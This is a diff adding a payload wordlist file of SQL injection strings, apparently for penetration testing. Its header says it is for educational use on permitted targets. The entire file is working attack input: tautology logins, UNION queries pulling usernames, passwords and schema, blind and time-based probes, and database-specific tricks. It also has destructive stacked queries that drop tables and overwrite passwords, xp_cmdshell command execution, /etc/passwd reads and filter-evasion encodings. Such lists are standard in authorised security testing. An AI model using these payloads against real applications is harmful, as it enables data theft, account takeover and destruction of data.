@@ -1,0 +1,140 @@
+# SQL Injection Payloads
+# This file contains various SQL injection attack vectors for testing
+# EDUCATIONAL USE ONLY - Only test on applications you own or have permission to test
+
+# ===== TAUTOLOGY-BASED INJECTIONS =====
+# Always true conditions
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+" OR 1=1--
+') OR ('1'='1
+') OR (1=1)--
+admin' OR '1'='1
+admin' OR 1=1--
+' OR 'a'='a
+" OR "a"="a
+1' OR '1'='1
+1' OR 1=1--
+
+# ===== COMMENT-BASED INJECTIONS =====
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin'#
+admin'/*
+' OR 1=1 --
+' OR 1=1 #
+
+# ===== UNION-BASED INJECTIONS =====
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT 1,2,3,4--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+# ===== ERROR-BASED INJECTIONS =====
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+'1
+"1
+`1
+\
+\\
+
+# ===== BOOLEAN-BASED BLIND INJECTIONS =====
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1' AND '1'='1
+1' AND '1'='2
+' AND SUBSTRING(version(),1,1)='5
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--
+
+# ===== TIME-BASED BLIND INJECTIONS =====
+' OR SLEEP(5)--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+1'; WAITFOR DELAY '0:0:5'--
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+' OR BENCHMARK(10000000,MD5('A'))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# ===== STACKED QUERIES =====
+'; DROP TABLE users--
+'; DELETE FROM users--
+'; UPDATE users SET password='hacked'--
+'; INSERT INTO users VALUES('hacker','pass123')--
+'; EXEC xp_cmdshell('whoami')--
+
+# ===== SECOND ORDER INJECTIONS =====
+admin'+'--
+admin'+or+'1'='1
+CHAR(39)+OR+CHAR(39)1CHAR(39)=CHAR(39)1
+
+# ===== MYSQL SPECIFIC =====
+' OR MID(@@version,1,1)='5
+' UNION SELECT @@version--
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
+' OR LOAD_FILE('/etc/passwd')--
+
+# ===== MSSQL SPECIFIC =====
+' AND SYSTEM_USER='sa
+' UNION SELECT @@version--
+'; EXEC xp_cmdshell('dir')--
+' AND 1=CONVERT(int,@@version)--
+
+# ===== POSTGRESQL SPECIFIC =====
+' AND 1::int='1
+' UNION SELECT NULL::text--
+' AND CAST(version() AS int)='1
+
+# ===== ORACLE SPECIFIC =====
+' OR 1=1--
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT banner FROM v$version--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+
+# ===== BYPASS TECHNIQUES =====
+# Case variation
+' Or 1=1--
+' oR 1=1--
+' OR 1=1--
+
+# URL encoding
+%27%20OR%201=1--
+%22%20OR%201=1--
+
+# Double encoding
+%2527%20OR%201=1--
+
+# Null byte
+%00' OR 1=1--
+
+# Whitespace alternatives
+'/**/OR/**/1=1--
+'+OR+1=1--
+'%09OR%091=1--
+'%0aOR%0a1=1--
+
+# ===== ADVANCED EVASION =====
+' OR 1=1 UNION ALL SELECT NULL,NULL--
+' OR '1'='1' UNION SELECT * FROM users--
+' OR 1=1 AND '1'='1
+' OR 'x'='x' --
+" OR "x"="x" --
+') OR ('x'='x
+") OR ("x"="x
